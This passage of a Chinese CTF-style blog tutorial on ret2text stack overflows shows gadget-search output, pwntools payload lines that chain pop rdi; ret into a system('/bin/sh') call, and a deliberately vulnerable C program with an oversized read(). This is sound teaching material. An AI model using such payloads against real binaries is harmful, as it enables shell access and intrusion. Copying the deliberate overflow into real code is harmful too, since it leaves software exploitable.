+</span></span><span class="line"><span class="cl">0x00000000004010bd : loopne 0x401125 <span class="p">;</span> nop <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0000000000401126 : mov byte ptr <span class="o">[</span>rip + 0x2f03<span class="o">]</span>, <span class="m">1</span> <span class="p">;</span> pop rbp <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x000000000040119a : mov eax, <span class="m">0</span> <span class="p">;</span> leave <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0000000000401159 : mov eax, <span class="m">0</span> <span class="p">;</span> pop rbp <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x00000000004010b7 : mov edi, 0x404030 <span class="p">;</span> jmp rax
+</span></span><span class="line"><span class="cl">0x0000000000401052 : mov edx, 0x6800002f <span class="p">;</span> add al, byte ptr <span class="o">[</span>rax<span class="o">]</span> <span class="p">;</span> add byte ptr <span class="o">[</span>rax<span class="o">]</span>, al <span class="p">;</span> jmp 0x401020
+</span></span><span class="line"><span class="cl">0x00000000004010bf : nop <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x000000000040113c : nop dword ptr <span class="o">[</span>rax<span class="o">]</span> <span class="p">;</span> endbr64 <span class="p">;</span> jmp 0x4010d0
+</span></span><span class="line"><span class="cl">0x000000000040108c : nop dword ptr <span class="o">[</span>rax<span class="o">]</span> <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x00000000004010b6 : or dword ptr <span class="o">[</span>rdi + 0x404030<span class="o">]</span>, edi <span class="p">;</span> jmp rax
+</span></span><span class="line"><span class="cl">0x000000000040112d : pop rbp <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x0000000000401036 : push <span class="m">0</span> <span class="p">;</span> jmp 0x401020
+</span></span><span class="line"><span class="cl">0x0000000000401046 : push <span class="m">1</span> <span class="p">;</span> jmp 0x401020
+</span></span><span class="line"><span class="cl">0x0000000000401056 : push <span class="m">2</span> <span class="p">;</span> jmp 0x401020
+</span></span><span class="line"><span class="cl">0x0000000000401016 : ret
+</span></span><span class="line"><span class="cl">0x0000000000401042 : ret 0x2f
+</span></span><span class="line"><span class="cl">0x0000000000401022 : retf 0x2f
+</span></span><span class="line"><span class="cl">0x000000000040100d : sal byte ptr <span class="o">[</span>rdx + rax - 1<span class="o">]</span>, 0xd0 <span class="p">;</span> add rsp, <span class="m">8</span> <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x00000000004011b9 : sub esp, <span class="m">8</span> <span class="p">;</span> add rsp, <span class="m">8</span> <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x00000000004011b8 : sub rsp, <span class="m">8</span> <span class="p">;</span> add rsp, <span class="m">8</span> <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">0x000000000040100c : <span class="nb">test</span> eax, eax <span class="p">;</span> je 0x401012 <span class="p">;</span> call rax
+</span></span><span class="line"><span class="cl">0x00000000004010b3 : <span class="nb">test</span> eax, eax <span class="p">;</span> je 0x4010c0 <span class="p">;</span> mov edi, 0x404030 <span class="p">;</span> jmp rax
+</span></span><span class="line"><span class="cl">0x00000000004010f5 : <span class="nb">test</span> eax, eax <span class="p">;</span> je 0x401100 <span class="p">;</span> mov edi, 0x404030 <span class="p">;</span> jmp rax
+</span></span><span class="line"><span class="cl">0x000000000040100b : <span class="nb">test</span> rax, rax <span class="p">;</span> je 0x401012 <span class="p">;</span> call rax
+</span></span><span class="line"><span class="cl">0x00000000004010b8 : xor byte ptr <span class="o">[</span>rax + 0x40<span class="o">]</span>, al <span class="p">;</span> add bh, bh <span class="p">;</span> loopne 0x401125 <span class="p">;</span> nop <span class="p">;</span> ret
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Unique gadgets found: <span class="m">60</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>栈布局</strong></p>
+<p><img src="/p/ret2text/ret2text8.png"
+	width="353"
+	height="333"
+	srcset="/p/ret2text/ret2text8_hu5992621685932997217.png 480w, /p/ret2text/ret2text8_hu1209889289395803638.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="106"
+		data-flex-basis="254px"
+	
+></p>
+<p>这里的<code>pop rdi;ret</code>相当于把栈顶的值给rdi，此时间接改变了rdi的值，成功给func传参</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">func_addr</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="减少溢出空间">减少溢出空间
+</h2><p><strong>如果溢出空间有限呢？</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">char</span> <span class="n">sh</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;/bin/sh&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="n">cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">dofunc</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">=</span><span class="p">{};</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">puts</span><span class="p">(</span><span class="s">&#34;input:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="mh">0x18</span><span class="p">);</span>  <span class="c1">// 0x100改为0x18
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">dofunc</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>x86下payload</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">call_system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>  <span class="c1"># /bin/sh改为sh减少空间占用</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/%E6%A0%88/">栈</a>
+        
+            <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a>
+        
+            <a href="/tags/ret2text/">Ret2text</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/ret2csu/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Ret2csu</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/%E6%A0%88%E8%BF%81%E7%A7%BB/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">栈迁移</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/pie-bypass/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Pie Bypass</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/srop/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Srop</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/ret2libc/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Ret2libc</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2024 Pwn3r4llD4ys
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
